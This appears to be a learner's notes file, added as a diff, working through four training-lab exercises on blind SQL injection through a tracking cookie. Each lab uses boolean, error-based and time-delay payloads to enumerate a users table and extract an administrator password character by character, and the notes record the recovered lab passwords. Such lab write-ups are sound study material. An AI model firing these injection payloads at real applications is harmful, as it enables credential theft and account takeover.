@@ -1,0 +1,143 @@
+1><Blind SQL injection> with conditional response
+
+vulnerable parameter - tracking cookie 
+
+END Goal:
+1> Enumerate the password of the adminstrator
+
+2> log in as the administrator user
+
+Analysis :
+...........
+
+1> confirm that the parameter is vulnerable to blind SQL injuction
+
+select tracking-id from tracking-tables where tracking id = 'RvLfBu6s9EZRlVYN'
+
+
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
+-> TRUE -> Welcome back
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
+-> FALSE -> no Welcome back
+
+2) Confirm that we have a users table
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
+-> users table exists in the database.
+
+3) Confirm that username administrator exists users table
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
+-> administrator user exists
+
+4) Enumerate the password of the administrator user
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+-> password is exactly 20 characters
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
+
+1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+52rqbjtjpa749cy0bv6s
+
+
+
+
+
+2><Blind SQL injection> with conditional errors
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Output the administrator password
+- Login as the administrator user
+
+Analysis:
+
+1) Prove that parameter is vulnerable
+
+' || (select '' from dual) || ' -> oracle database
+
+' || (select '' from dualfiewjfow) || ' -> error
+
+2) Confirm that the users table exists in the database
+
+' || (select '' from users where rownum =1) || ' 
+-> users table exists
+
+3) Confirm that the administrator user exists in the users table
+' || (select '' from users where username='administrator') || ' 
+
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+4) Determine length of password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+-> 200 response at 50 -> length of password is less than 50
+-> 20 characters
+
+5) Output the administrator password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+-> w is not the first character of the password
+
+wjuc497wl6szhbtf0cbf
+
+
+
+3><Blind SQL Injection> with time delays
+
+Vulnerable parameter - tracking cookie
+
+End Goal:
+- to prove that the field is vulnerable to blind SQLi (time based)
+
+Analysis:
+
+select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
+
+' || (SELECT sleep(10))-- -x
+' || (SELECT pg_sleep(10))-- 
+
+
+4><Blind SQL Injuction> with time delays and informational retrieval
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Exploit time-based blind SQLi to output the administrator password
+- Login as the administrator user
+
+Analysis:
+
+1) Confirm that the parameter is vulnerable to SQLi
+
+' || pg_sleep(10)--
+
+2) Confirm that the users table exists in the database
+
+' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
+
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3) Enumerate the password length
+
+' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
+-> length of password is 20 characters
+
+4) Enumerate the administrator password
+
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+13ipnob7l2dkjp3drryy
